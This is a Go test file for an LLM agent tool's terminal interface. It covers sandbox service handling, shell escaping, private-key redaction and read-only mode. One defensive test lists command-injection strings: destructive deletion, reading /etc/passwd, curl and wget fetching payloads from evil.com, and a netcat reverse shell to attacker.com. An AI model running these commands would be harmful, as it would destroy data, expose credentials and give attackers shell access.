package tui

import (
	"context"
	"encoding/base64"
	"errors"
	"io"
	"log/slog"
	"strings"
	"testing"
	"time"

	tea "github.com/charmbracelet/bubbletea"

	"github.com/aspectrr/deer.sh/deer-cli/internal/config"
	"github.com/aspectrr/deer.sh/deer-cli/internal/hostexec"
	"github.com/aspectrr/deer.sh/deer-cli/internal/llm"
	"github.com/aspectrr/deer.sh/deer-cli/internal/redact"
	"github.com/aspectrr/deer.sh/deer-cli/internal/sandbox"
	"github.com/aspectrr/deer.sh/deer-cli/internal/source"
	"github.com/aspectrr/deer.sh/deer-cli/internal/telemetry"
)

// stubService is a minimal sandbox.Service for testing SetSandboxService.
type stubService struct {
	closed                bool
	createSandboxStreamFn func(context.Context, sandbox.CreateRequest, func(string, int, int)) (*sandbox.SandboxInfo, error)
}

func (s *stubService) CreateSandbox(context.Context, sandbox.CreateRequest) (*sandbox.SandboxInfo, error) {
	return nil, nil
}

func (s *stubService) GetSandbox(context.Context, string) (*sandbox.SandboxInfo, error) {
	return nil, nil
}

func (s *stubService) ListSandboxes(context.Context) ([]*sandbox.SandboxInfo, error) {
	return nil, nil
}
func (s *stubService) DestroySandbox(context.Context, string) error { return nil }
func (s *stubService) StartSandbox(context.Context, string) (*sandbox.SandboxInfo, error) {
	return nil, nil
}
func (s *stubService) StopSandbox(context.Context, string, bool) error { return nil }
func (s *stubService) RunCommand(context.Context, string, string, int, map[string]string) (*sandbox.CommandResult, error) {
	return nil, nil
}

func (s *stubService) CreateSnapshot(context.Context, string, string) (*sandbox.SnapshotInfo, error) {
	return nil, nil
}

func (s *stubService) ListVMs(context.Context) ([]*sandbox.VMInfo, error) {
	return []*sandbox.VMInfo{{Name: "ubuntu", State: "running"}}, nil
}

func (s *stubService) ValidateSourceVM(context.Context, string) (*sandbox.ValidationInfo, error) {
	return nil, nil
}

func (s *stubService) PrepareSourceVM(context.Context, string, string, string) (*sandbox.PrepareInfo, error) {
	return nil, nil
}

func (s *stubService) RunSourceCommand(context.Context, string, string, int) (*sandbox.SourceCommandResult, error) {
	return nil, nil
}

func (s *stubService) ReadSourceFile(context.Context, string, string) (string, error) {
	return "", nil
}

func (s *stubService) CreateSandboxStream(_ context.Context, req sandbox.CreateRequest, progress func(string, int, int)) (*sandbox.SandboxInfo, error) {
	if s.createSandboxStreamFn != nil {
		return s.createSandboxStreamFn(context.Background(), req, progress)
	}
	return s.CreateSandbox(context.Background(), req)
}
func (s *stubService) GetHostInfo(context.Context) (*sandbox.HostInfo, error) { return nil, nil }
func (s *stubService) Health(context.Context) error                           { return nil }
func (s *stubService) DoctorCheck(context.Context) ([]sandbox.DoctorCheckResult, error) {
	return nil, nil
}

func (s *stubService) ScanSourceHostKeys(context.Context) ([]sandbox.ScanSourceHostKeysResult, error) {
	return nil, nil
}

func (s *stubService) Close() error {
	s.closed = true
	return nil
}

func TestSetSandboxService_AfterCancel(t *testing.T) {
	a := &DeerAgent{}
	svc := &stubService{}
	if err := a.SetSandboxService(svc); err != nil {
		t.Fatalf("SetSandboxService on idle agent should succeed: %v", err)
	}
	if a.service != svc {
		t.Fatal("expected service to be set")
	}
}

func TestSetSandboxService_WhileRunning(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	a := &DeerAgent{
		cancelFunc: cancel,
		done:       make(chan struct{}),
	}
	// Simulate a running agent by keeping ctx alive
	_ = ctx
	svc := &stubService{}
	err := a.SetSandboxService(svc)
	if err == nil {
		t.Fatal("expected error when agent is running")
	}
	if !strings.Contains(err.Error(), "cancel first") {
		t.Fatalf("unexpected error: %v", err)
	}
}

func TestSetSandboxService_ClosesOldService(t *testing.T) {
	oldSvc := &stubService{}
	a := &DeerAgent{service: oldSvc}
	newSvc := &stubService{}
	if err := a.SetSandboxService(newSvc); err != nil {
		t.Fatalf("SetSandboxService should succeed: %v", err)
	}
	if !oldSvc.closed {
		t.Fatal("expected old service to be closed")
	}
	if a.service != newSvc {
		t.Fatal("expected new service to be set")
	}
}

func TestSetSandboxService_WaitsForDone(t *testing.T) {
	done := make(chan struct{})
	a := &DeerAgent{done: done, swapTimeout: 2 * time.Second}
	// Close done channel to simulate goroutine finishing
	close(done)
	svc := &stubService{}
	if err := a.SetSandboxService(svc); err != nil {
		t.Fatalf("SetSandboxService should succeed after done: %v", err)
	}
}

func TestSetSandboxService_TimesOut(t *testing.T) {
	done := make(chan struct{}) // never closed
	a := &DeerAgent{done: done}
	svc := &stubService{}
	err := a.SetSandboxService(svc)
	if err == nil {
		t.Fatal("expected timeout error")
	}
	if !strings.Contains(err.Error(), "timed out") {
		t.Fatalf("unexpected error: %v", err)
	}
}

func TestRun_SlashCommandSendsFinalResponseWithoutQueuedDoneStatus(t *testing.T) {
	var statuses []tea.Msg
	agent := &DeerAgent{
		cfg:       &config.Config{},
		telemetry: telemetry.NewNoopService(),
		logger:    slog.New(slog.NewTextHandler(io.Discard, nil)),
	}
	agent.SetStatusCallback(func(msg tea.Msg) {
		statuses = append(statuses, msg)
	})

	result := agent.Run("/help")()
	if _, ok := result.(AgentDoneMsg); !ok {
		t.Fatalf("Run(/help) returned %T, want AgentDoneMsg", result)
	}
	if len(statuses) != 1 {
		t.Fatalf("status count = %d, want 1", len(statuses))
	}
	resp, ok := statuses[0].(AgentResponseMsg)
	if !ok {
		t.Fatalf("status type = %T, want AgentResponseMsg", statuses[0])
	}
	if !resp.Response.Done {
		t.Fatal("expected help response to mark the run complete")
	}
	if !strings.Contains(resp.Response.Content, "Available Commands") {
		t.Fatalf("help response missing command list: %q", resp.Response.Content)
	}
	for _, status := range statuses {
		if _, ok := status.(AgentDoneMsg); ok {
			t.Fatal("AgentDoneMsg should not be queued through the status callback")
		}
	}
}

func TestRun_LLMConfigErrorSendsStatusWithoutQueuedDone(t *testing.T) {
	var statuses []tea.Msg
	agent := &DeerAgent{
		cfg:       &config.Config{},
		telemetry: telemetry.NewNoopService(),
		logger:    slog.New(slog.NewTextHandler(io.Discard, nil)),
	}
	agent.SetStatusCallback(func(msg tea.Msg) {
		statuses = append(statuses, msg)
	})

	result := agent.Run("investigate nginx")()
	if _, ok := result.(AgentDoneMsg); !ok {
		t.Fatalf("Run(investigate nginx) returned %T, want AgentDoneMsg", result)
	}
	if len(statuses) != 1 {
		t.Fatalf("status count = %d, want 1", len(statuses))
	}
	errMsg, ok := statuses[0].(AgentErrorMsg)
	if !ok {
		t.Fatalf("status type = %T, want AgentErrorMsg", statuses[0])
	}
	if !strings.Contains(errMsg.Err.Error(), "LLM provider not configured") {
		t.Fatalf("unexpected error: %v", errMsg.Err)
	}
	for _, status := range statuses {
		if _, ok := status.(AgentDoneMsg); ok {
			t.Fatal("AgentDoneMsg should not be queued through the status callback")
		}
	}
}

func TestCreateSandbox_SendsDoneProgressOnSuccess(t *testing.T) {
	var statuses []tea.Msg
	svc := &stubService{
		createSandboxStreamFn: func(_ context.Context, _ sandbox.CreateRequest, progress func(string, int, int)) (*sandbox.SandboxInfo, error) {
			progress("Discovering IP address", 8, 9)
			return &sandbox.SandboxInfo{
				ID:        "SBX-123",
				Name:      "sandbox",
				State:     "RUNNING",
				BaseImage: "ubuntu",
				IPAddress: "10.0.0.2",
			}, nil
		},
	}
	agent := &DeerAgent{
		service: svc,
		logger:  slog.New(slog.NewTextHandler(io.Discard, nil)),
	}
	agent.SetStatusCallback(func(msg tea.Msg) {
		statuses = append(statuses, msg)
	})

	result, err := agent.createSandbox(context.Background(), "ubuntu", "", 2, 2048, true, false, false)
	if err != nil {
		t.Fatalf("createSandbox returned error: %v", err)
	}
	if got := result["sandbox_id"]; got != "SBX-123" {
		t.Fatalf("sandbox_id = %v, want %q", got, "SBX-123")
	}

	progresses := collectCreateProgressMessages(statuses)
	if len(progresses) != 2 {
		t.Fatalf("progress message count = %d, want 2", len(progresses))
	}
	if progresses[0].Done {
		t.Fatal("expected first progress message to be in-flight")
	}
	if !progresses[1].Done {
		t.Fatal("expected final progress message to mark creation done")
	}
	if progresses[1].StepName != "Ready" || progresses[1].StepNum != 9 || progresses[1].Total != 9 {
		t.Fatalf("final done progress = %+v, want Ready [9/9]", progresses[1])
	}
}

func TestCreateSandbox_SendsDoneProgressOnError(t *testing.T) {
	var statuses []tea.Msg
	svc := &stubService{
		createSandboxStreamFn: func(_ context.Context, _ sandbox.CreateRequest, progress func(string, int, int)) (*sandbox.SandboxInfo, error) {
			progress("Booting microVM", 7, 9)
			return nil, errors.New("boom")
		},
	}
	agent := &DeerAgent{
		service: svc,
		logger:  slog.New(slog.NewTextHandler(io.Discard, nil)),
	}
	agent.SetStatusCallback(func(msg tea.Msg) {
		statuses = append(statuses, msg)
	})

	_, err := agent.createSandbox(context.Background(), "ubuntu", "", 2, 2048, true, false, false)
	if err == nil {
		t.Fatal("expected createSandbox to return error")
	}

	progresses := collectCreateProgressMessages(statuses)
	if len(progresses) != 2 {
		t.Fatalf("progress message count = %d, want 2", len(progresses))
	}
	if !progresses[1].Done {
		t.Fatal("expected final progress message to close the live create box on error")
	}
	if progresses[1].StepName != "" || progresses[1].StepNum != 0 || progresses[1].Total != 0 {
		t.Fatalf("error done progress = %+v, want empty step details", progresses[1])
	}
}

func TestNormalizeVMName(t *testing.T) {
	tests := []struct {
		input    string
		expected string
	}{
		{"Deer Source VM", "deer-source-vm"},
		{"deer-source-vm", "deer-source-vm"},
		{"Deer_Source_VM", "deer-source-vm"},
		{"deer_source_vm", "deer-source-vm"},
		{"Deer--Source  VM", "deer-source-vm"},
		{"  Deer Source VM  ", "deer-source-vm"},
		{"Ubuntu", "ubuntu"},
		{"My Cool Image", "my-cool-image"},
		{"my-cool-image", "my-cool-image"},
	}
	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			got := normalizeVMName(tt.input)
			if got != tt.expected {
				t.Errorf("normalizeVMName(%q) = %q, want %q", tt.input, got, tt.expected)
			}
		})
	}
}

func collectCreateProgressMessages(statuses []tea.Msg) []SandboxCreateProgressMsg {
	progresses := make([]SandboxCreateProgressMsg, 0, len(statuses))
	for _, status := range statuses {
		if progress, ok := status.(SandboxCreateProgressMsg); ok {
			progresses = append(progresses, progress)
		}
	}
	return progresses
}

func TestShellEscape(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "simple path",
			input:    "/path/to/file",
			expected: "'/path/to/file'",
		},
		{
			name:     "path with spaces",
			input:    "/path/with spaces/file",
			expected: "'/path/with spaces/file'",
		},
		{
			name:     "path with single quote",
			input:    "/path/with'quote/file",
			expected: "'/path/with'\\''quote/file'",
		},
		{
			name:     "path with multiple single quotes",
			input:    "/path/'with'/'multiple'/quotes",
			expected: "'/path/'\\''with'\\''/'\\''multiple'\\''/quotes'",
		},
		{
			name:     "path with double quote",
			input:    `/path/with"doublequote/file`,
			expected: `'/path/with"doublequote/file'`,
		},
		{
			name:     "path with dollar sign",
			input:    "/path/with$(command)/file",
			expected: "'/path/with$(command)/file'",
		},
		{
			name:     "path with backtick",
			input:    "/path/with`backtick`/file",
			expected: "'/path/with`backtick`/file'",
		},
		{
			name:     "path with semicolon",
			input:    "/path/with;semicolon/file",
			expected: "'/path/with;semicolon/file'",
		},
		{
			name:     "path with ampersand",
			input:    "/path/with&ampersand/file",
			expected: "'/path/with&ampersand/file'",
		},
		{
			name:     "path with pipe",
			input:    "/path/with|pipe/file",
			expected: "'/path/with|pipe/file'",
		},
		{
			name:     "empty string",
			input:    "",
			expected: "''",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := shellEscape(tt.input)
			if result != tt.expected {
				t.Errorf("shellEscape(%q) = %q, want %q", tt.input, result, tt.expected)
			}
		})
	}
}

// redactViaRedactor is a test helper that uses the same Redactor the agent uses.
func redactViaRedactor(content string) (string, bool) {
	r := redact.New()
	result := r.Redact(content)
	return result, result != content
}

func TestRedactPrivateKeys_RSAKey(t *testing.T) {
	input := "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----"
	result, redacted := redactViaRedactor(input)
	if !redacted {
		t.Fatal("expected redaction")
	}
	if strings.Contains(result, "BEGIN RSA PRIVATE KEY") {
		t.Errorf("key content should be redacted: %s", result)
	}
}

func TestRedactPrivateKeys_ECKey(t *testing.T) {
	input := "-----BEGIN EC PRIVATE KEY-----\nMHQCAQEEI...\n-----END EC PRIVATE KEY-----"
	result, redacted := redactViaRedactor(input)
	if !redacted {
		t.Fatal("expected redaction")
	}
	if strings.Contains(result, "BEGIN EC PRIVATE KEY") {
		t.Errorf("key content should be redacted: %s", result)
	}
}

func TestRedactPrivateKeys_GenericKey(t *testing.T) {
	input := "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBg...\n-----END PRIVATE KEY-----"
	result, redacted := redactViaRedactor(input)
	if !redacted {
		t.Fatal("expected redaction")
	}
	if strings.Contains(result, "BEGIN PRIVATE KEY") {
		t.Errorf("key content should be redacted: %s", result)
	}
}

func TestRedactPrivateKeys_NoKey(t *testing.T) {
	input := "just some normal file content\nwith multiple lines"
	result, redacted := redactViaRedactor(input)
	if redacted {
		t.Fatal("expected no redaction")
	}
	if result != input {
		t.Errorf("content should be unchanged")
	}
}

func TestRedactPrivateKeys_MixedContent(t *testing.T) {
	input := "# Config file\nssl_key: |\n-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----\nssl_port: 443"
	result, redacted := redactViaRedactor(input)
	if !redacted {
		t.Fatal("expected redaction")
	}
	if !strings.Contains(result, "ssl_port: 443") {
		t.Error("non-key content should be preserved")
	}
	if strings.Contains(result, "MIIEpAIBAAKCAQEA") {
		t.Error("key content should be removed")
	}
}

func TestRedactPrivateKeys_MultipleKeys(t *testing.T) {
	input := "-----BEGIN RSA PRIVATE KEY-----\nkey1\n-----END RSA PRIVATE KEY-----\nsome text\n-----BEGIN EC PRIVATE KEY-----\nkey2\n-----END EC PRIVATE KEY-----"
	result, redacted := redactViaRedactor(input)
	if !redacted {
		t.Fatal("expected redaction")
	}
	if strings.Contains(result, "key1") || strings.Contains(result, "key2") {
		t.Error("both keys should be redacted")
	}
	if !strings.Contains(result, "some text") {
		t.Error("text between keys should be preserved")
	}
}

func TestRedactPrivateKeys_CRLF(t *testing.T) {
	input := "-----BEGIN RSA PRIVATE KEY-----\r\nMIIEowIBAAKCAQEA...\r\n-----END RSA PRIVATE KEY-----"
	result, redacted := redactViaRedactor(input)
	if !redacted {
		t.Fatal("expected redaction")
	}
	if strings.Contains(result, "BEGIN RSA PRIVATE KEY") {
		t.Errorf("key should be redacted: %s", result)
	}
}

func TestRedactSensitiveKeys_Base64PEM(t *testing.T) {
	pem := "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----"
	encoded := base64.StdEncoding.EncodeToString([]byte(pem))
	result, redacted := redactViaRedactor(encoded)
	if !redacted {
		t.Fatal("expected base64 PEM key to be redacted")
	}
	if strings.Contains(result, "LS0tLS1CRUdJTi") {
		t.Error("base64 PEM content should be replaced")
	}
}

func TestRedactSensitiveKeys_Base64ECPEM(t *testing.T) {
	pem := "-----BEGIN EC PRIVATE KEY-----\nMHQCAQEEI...\n-----END EC PRIVATE KEY-----"
	encoded := base64.StdEncoding.EncodeToString([]byte(pem))
	result, redacted := redactViaRedactor(encoded)
	if !redacted {
		t.Fatal("expected base64 EC PEM key to be redacted")
	}
	if strings.Contains(result, "LS0tLS1CRUdJTi") {
		t.Error("base64 EC PEM content should be replaced")
	}
}

func TestRedactSensitiveKeys_K8sYAMLSecret(t *testing.T) {
	input := "  tls.key: " + strings.Repeat("ABCDEFGHIJKLMNOP", 5)
	result, redacted := redactViaRedactor(input)
	if !redacted {
		t.Fatal("expected K8s tls.key field to be redacted")
	}
	if !strings.Contains(result, "[REDACTED_KEY_") {
		t.Errorf("unexpected result: %s", result)
	}
}

func TestRedactSensitiveKeys_K8sJSONSecret(t *testing.T) {
	input := `"private_key": "` + strings.Repeat("ABCDEFGHIJKLMNOP", 5) + `"`
	result, redacted := redactViaRedactor(input)
	if !redacted {
		t.Fatal("expected K8s private_key field to be redacted")
	}
	if !strings.Contains(result, "[REDACTED_KEY_") {
		t.Errorf("unexpected result: %s", result)
	}
}

func TestRedactSensitiveKeys_RegularBase64NotRedacted(t *testing.T) {
	// Base64 that decodes to regular text, not a private key
	input := base64.StdEncoding.EncodeToString([]byte("just some regular content"))
	result, redacted := redactViaRedactor(input)
	if redacted {
		t.Fatal("regular base64 should not be redacted")
	}
	if result != input {
		t.Error("content should be unchanged")
	}
}

func TestRedactSensitiveKeys_NoKeys(t *testing.T) {
	input := "just some normal file content\nwith multiple lines"
	result, redacted := redactViaRedactor(input)
	if redacted {
		t.Fatal("expected no redaction")
	}
	if result != input {
		t.Error("content should be unchanged")
	}
}

func TestRedactPrivateKeys_CertificateNotRedacted(t *testing.T) {
	input := "-----BEGIN CERTIFICATE-----\nMIIDXTCCAkWgAwIBAgIJ...\n-----END CERTIFICATE-----"
	result, redacted := redactViaRedactor(input)
	if redacted {
		t.Fatal("certificates should not be redacted")
	}
	if result != input {
		t.Errorf("certificate content should be unchanged")
	}
}

// TestWithAutoReadOnly_StickyDisplay verifies that after a source VM op, model receives
// AutoReadOnlyMsg{Enabled:true} but NOT AutoReadOnlyMsg{Enabled:false} on exit.
func TestWithAutoReadOnly_StickyDisplay(t *testing.T) {
	var msgs []AutoReadOnlyMsg
	a := &DeerAgent{}
	a.SetStatusCallback(func(msg tea.Msg) {
		if m, ok := msg.(AutoReadOnlyMsg); ok {
			msgs = append(msgs, m)
		}
	})

	_, _ = a.withAutoReadOnly("myvm", func() (any, error) {
		return nil, nil
	})

	if len(msgs) != 1 {
		t.Fatalf("expected 1 AutoReadOnlyMsg, got %d: %v", len(msgs), msgs)
	}
	if !msgs[0].Enabled {
		t.Error("expected Enabled:true enter message")
	}
	if !a.displayReadOnly {
		t.Error("displayReadOnly should remain true after withAutoReadOnly exits")
	}
	if a.readOnly {
		t.Error("readOnly (tool-filtering) should be restored to false")
	}
}

// TestClearStickyReadOnly_SendsExitMsg verifies that clearStickyReadOnly sends the exit message.
func TestClearStickyReadOnly_SendsExitMsg(t *testing.T) {
	var msgs []AutoReadOnlyMsg
	a := &DeerAgent{displayReadOnly: true}
	a.SetStatusCallback(func(msg tea.Msg) {
		if m, ok := msg.(AutoReadOnlyMsg); ok {
			msgs = append(msgs, m)
		}
	})

	a.clearStickyReadOnly()

	if len(msgs) != 1 {
		t.Fatalf("expected 1 AutoReadOnlyMsg, got %d", len(msgs))
	}
	if msgs[0].Enabled {
		t.Error("expected Enabled:false exit message")
	}
	if a.displayReadOnly {
		t.Error("displayReadOnly should be cleared")
	}
}

// TestClearStickyReadOnly_NoOp verifies that clearStickyReadOnly is a no-op when not sticky.
func TestClearStickyReadOnly_NoOp(t *testing.T) {
	var msgs []AutoReadOnlyMsg
	a := &DeerAgent{displayReadOnly: false}
	a.SetStatusCallback(func(msg tea.Msg) {
		if m, ok := msg.(AutoReadOnlyMsg); ok {
			msgs = append(msgs, m)
		}
	})

	a.clearStickyReadOnly()

	if len(msgs) != 0 {
		t.Fatalf("expected no messages, got %d", len(msgs))
	}
}

// TestClearAutoReadOnly_ClearsDisplayReadOnly verifies that Shift+Tab also clears displayReadOnly.
func TestClearAutoReadOnly_ClearsDisplayReadOnly(t *testing.T) {
	a := &DeerAgent{autoReadOnly: true, displayReadOnly: true}
	a.ClearAutoReadOnly()
	if a.displayReadOnly {
		t.Error("ClearAutoReadOnly should also clear displayReadOnly")
	}
	if a.autoReadOnly {
		t.Error("ClearAutoReadOnly should clear autoReadOnly")
	}
}

// TestWithAutoReadOnly_AlreadyReadOnly verifies that when agent is already in manual read-only,
// displayReadOnly is not set (user controls the mode).
func TestWithAutoReadOnly_AlreadyReadOnly(t *testing.T) {
	var msgs []AutoReadOnlyMsg
	a := &DeerAgent{readOnly: true}
	a.SetStatusCallback(func(msg tea.Msg) {
		if m, ok := msg.(AutoReadOnlyMsg); ok {
			msgs = append(msgs, m)
		}
	})

	_, _ = a.withAutoReadOnly("myvm", func() (any, error) {
		return nil, nil
	})

	if len(msgs) != 0 {
		t.Fatalf("expected no AutoReadOnlyMsg when already in read-only, got %d", len(msgs))
	}
	if a.displayReadOnly {
		t.Error("displayReadOnly should not be set when already manually in read-only")
	}
}

// TestShellEscapeInjectionPrevention tests that shellEscape prevents command injection
func TestShellEscapeInjectionPrevention(t *testing.T) {
	maliciousInputs := []string{
		"'; rm -rf /; echo '",
		"' && cat /etc/passwd && echo '",
		"'; curl http://evil.com/malware.sh | sh; echo '",
		"' || wget http://evil.com/backdoor.sh -O /tmp/backdoor.sh || '",
		"'; nc -e /bin/sh attacker.com 4444; echo '",
	}

	for _, input := range maliciousInputs {
		result := shellEscape(input)
		// The escaped result should still be wrapped in single quotes
		// and should not contain unescaped single quotes that would break out
		if result[0] != '\'' || result[len(result)-1] != '\'' {
			t.Errorf("shellEscape did not wrap input in quotes: %q", result)
		}

		// Verify that the escaped string doesn't contain standalone single quotes
		// that would break out of the quoting context
		// (Note: '\'' sequences are safe as they properly escape the quote)
		// We're checking that we don't have a single quote without the escape sequence
		for i := 0; i < len(result); i++ {
			if result[i] == '\'' {
				// This is okay if it's at the start or end
				if i == 0 || i == len(result)-1 {
					continue
				}
				// This is okay if it's part of the '\'' escape sequence
				if i >= 1 && result[i-1] == '\\' {
					continue
				}
				// This is okay if it starts the '\'' sequence
				if i+2 < len(result) && result[i+1] == '\\' && result[i+2] == '\'' {
					continue
				}
				// This is okay if it ends the '\'' sequence
				if i >= 2 && result[i-2] == '\\' && result[i-1] == '\'' {
					continue
				}
				t.Errorf("Found unescaped single quote in result at position %d: %q", i, result)
			}
		}
	}
}

// stubSourceProvider implements source.Provider for testing.
type stubSourceProvider struct {
	runStreamingFn func(ctx context.Context, hostName, command string, onOutput hostexec.OutputCallback) (*source.CommandResult, error)
}

func (s *stubSourceProvider) RunCommandStreaming(ctx context.Context, hostName, command string, onOutput hostexec.OutputCallback) (*source.CommandResult, error) {
	if s.runStreamingFn != nil {
		return s.runStreamingFn(ctx, hostName, command, onOutput)
	}
	return &source.CommandResult{ExitCode: 0}, nil
}

func (s *stubSourceProvider) ReadFile(_ context.Context, _, _ string) (string, error) { return "", nil }
func (s *stubSourceProvider) ListHosts() []source.HostInfo                            { return nil }
func (s *stubSourceProvider) RunCommandElevated(_ context.Context, _, _ string) (*source.CommandResult, error) {
	return &source.CommandResult{ExitCode: 0}, nil
}

// TestRunSourceCommand_StreamingChunksAreRedacted verifies that sensitive content
// in streaming output chunks is redacted before being sent to the TUI live output box.
func TestRunSourceCommand_StreamingChunksAreRedacted(t *testing.T) {
	sensitiveIP := "10.42.7.99"
	sensitiveOutput := "Connected to " + sensitiveIP + ":9093\n"

	stub := &stubSourceProvider{
		runStreamingFn: func(_ context.Context, _, _ string, onOutput hostexec.OutputCallback) (*source.CommandResult, error) {
			onOutput(sensitiveOutput, false)
			return &source.CommandResult{
				ExitCode: 0,
				Stdout:   sensitiveOutput,
			}, nil
		},
	}

	cfg := &config.Config{}
	cfg.Redact.Enabled = true
	r := redact.New()

	var chunks []CommandOutputChunkMsg
	agent := &DeerAgent{
		cfg:           cfg,
		sourceService: stub,
		redactor:      r,
		redactedSeen:  make(map[string]bool),
		logger:        slog.New(slog.NewTextHandler(io.Discard, nil)),
	}
	agent.SetStatusCallback(func(msg tea.Msg) {
		if c, ok := msg.(CommandOutputChunkMsg); ok {
			chunks = append(chunks, c)
		}
	})

	result, err := agent.executeTool(context.Background(), llm.ToolCall{
		ID: "test-call-1",
		Function: llm.FunctionCall{
			Name:      "run_source_command",
			Arguments: `{"host":"logstash-source","command":"netstat -tuln | grep 9093"}`,
		},
	})
	if err != nil {
		t.Fatalf("executeTool error: %v", err)
	}

	// Chunk sent to TUI must not contain the raw IP.
	if len(chunks) == 0 {
		t.Fatal("expected at least one CommandOutputChunkMsg")
	}
	for _, c := range chunks {
		if strings.Contains(c.Chunk, sensitiveIP) {
			t.Errorf("chunk sent to TUI contains unredacted IP %q: %q", sensitiveIP, c.Chunk)
		}
	}

	// Tool result returned to the LLM must also not contain the raw IP.
	if m, ok := result.(map[string]any); ok {
		if stdout, ok := m["stdout"].(string); ok && strings.Contains(stdout, sensitiveIP) {
			t.Errorf("tool result stdout contains unredacted IP %q: %q", sensitiveIP, stdout)
		}
	}
}
